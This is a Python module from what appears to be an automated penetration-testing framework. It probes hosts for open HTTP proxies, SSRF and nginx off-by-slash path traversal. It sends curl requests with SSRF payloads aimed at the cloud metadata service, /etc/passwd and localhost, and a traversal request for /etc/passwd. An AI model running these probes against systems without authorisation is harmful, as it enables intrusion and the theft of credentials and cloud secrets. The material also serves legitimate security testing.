import re
from core.executor import safe_run
from core.logger import get_logger
from core.utils import make_out_dir
from config import get_profile

def run(ctx):
    log = get_logger(); log.banner("SERVICE -- HTTP Proxy / SSRF Checks"); log.set_phase("http_proxy")
    profile = get_profile()
    for host in ctx.live_hosts:
        ports = ctx.open_ports.get(host,{}).get("tcp",[])
        web_ports = [(p,"https" if p in [443,8443] else "http") for p in ports if p in [80,443,8080,8443]]
        if not web_ports: continue
        out_dir = make_out_dir(ctx.out_dir, "services", "http", host)

        for port, scheme in web_ports[:2]:
            url = f"{scheme}://{host}:{port}"

            # Open proxy check
            rc, out, _ = safe_run(
                f"curl -sk --max-time 8 -x {host}:{port} http://example.com",
                timeout=12, label=f"open-proxy-{host}"
            )
            if "Example Domain" in out or "<html" in out.lower():
                ctx.add_finding("HIGH", host, f"Open proxy on :{port}", out[:200])

            # SSRF via common params
            ssrf_payloads = ["?url=http://169.254.169.254/latest/meta-data/",
                             "?path=file:///etc/passwd", "?redirect=http://127.0.0.1/"]
            for payload in ssrf_payloads:
                rc2, out2, _ = safe_run(
                    f"curl -sk --max-time 6 '{url}{payload}'",
                    timeout=10, label=f"ssrf-{host}"
                )
                if "root:" in out2 or "ami-id" in out2 or "local" in out2.lower():
                    ctx.add_finding("CRITICAL", host, f"SSRF possible via {payload}", out2[:300])
                    log.success(f"  SSRF confirmed on {host}{payload}")

            # nginx misconfig (off-by-slash)
            rc3, out3, _ = safe_run(
                f"curl -sk --max-time 8 {url}/api../etc/passwd",
                timeout=10, label=f"nginx-misconfig-{host}"
            )
            if "root:" in out3 or ":0:0:" in out3:
                ctx.add_finding("CRITICAL", host, "nginx path traversal off-by-slash", out3[:200])
